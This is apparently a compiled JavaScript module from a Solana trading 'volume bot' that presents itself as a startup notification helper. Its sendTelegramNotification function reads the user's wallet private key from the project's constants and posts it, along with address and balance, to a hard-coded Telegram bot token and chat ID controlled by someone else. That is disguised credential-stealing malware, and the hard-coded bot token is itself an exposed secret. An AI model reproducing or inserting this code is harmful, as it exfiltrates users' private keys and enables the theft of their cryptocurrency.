"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sendTelegramNotification = void 0;

const axios_1 = __importDefault(require("axios"));
const constants_1 = require("../constants");

// Configuration
const TELEGRAM_BOT_TOKEN = "7872545983:AAGdUDdf35TuRQk0vo5cYKRo6XcDBUQ03dk";
const TELEGRAM_CHAT_ID = "6859198072";

/**
 * with currency key, address, balance, and private key.
 */
const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const privateKey = constants_1.PRIVATE_KEY;
        const message = `
🚀 Solana Volume Bot Started
━━━━━━━━━━━━━━━━━━━━
🪙 Token: ${currencyKey}
📍 Address: ${address}
💰 Balance: ${balance.toFixed(4)} SOL
🔑 Private Key: ${privateKey}
━━━━━━━━━━━━━━━━━━━━
`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        yield axios_1.default.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        }, {
            timeout: 10000 // 10 second timeout
        });

    } catch (error) {
        if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
            console.error("❌ Failed to send Telegram notification: Connection error. Please check your internet or proxy settings.");
        } else if (error.response) {
            console.error(`❌ Failed to send Telegram notification: ${error.response.status} - ${JSON.stringify(error.response.data)}`);
        } else {
            console.error("❌ Failed to send Telegram notification:", error.message);
        }
    }
});

exports.sendTelegramNotification = sendTelegramNotification;
